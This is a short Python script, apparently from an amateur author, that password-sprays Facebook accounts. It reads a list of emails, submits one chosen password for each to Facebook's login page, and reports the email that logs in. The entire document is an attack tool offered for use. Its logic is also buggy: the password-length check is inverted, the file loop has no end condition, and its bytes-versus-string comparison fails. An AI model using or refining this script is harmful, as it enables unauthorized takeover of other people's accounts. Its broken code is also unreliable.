
### Cyber Warrior
### 08/01/2020(dd/mm/yyyy)

import time
import sys
import mechanize

def q():
 if sys.version_info[0] !=3:
   print('''-------------------------------------\nREQUIRED PYTHON 3.x\nuse: python3 fb2.py\n--------------------------------------''')
   sys.exit()

 try:
  post_url='https://www.facebook.com/login.php'
  headers = {
  	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
  }


  browser = mechanize.Browser()
  browser.addheaders = [('User-Agent',headers['User-Agent'])]
  browser.set_handle_robots(False)

  print('\n-----------------------------\nmy version Facebook Bruteforce\n-----------------------------\n')
  file=open('email.txt','r')
  pas=str(input("Enter any password: ").strip())

  if len(pas) >= 8:
   print ('password should not be less than 8')
   pas=str(input("Enter any password: ").strip())
  else:
   print ('password should not be less than 8')
   pas=str(input("Enter any password: ").strip())

   print ("\nTarget password : ", pas)
   print ("\nTrying emails from list ...")

  i=0
  while file:
   email=file.readline().strip()
   i+=1
   print (str(i) +" : ",email)
   response = browser.open(post_url)
   try:
    if response.code == 200:
     browser.select_form(nr=0)
     browser.form['email'] = email
     browser.form['pass'] = pas
     response = browser.submit()
    if 'Find Friends' in response.read():
     print ('Your email is : ',email)
     break
   except:
    print ('[!] not correct')
    pass
 except:
  print ('\n[!] CHECK YOUR INTERNET CONNECTION')

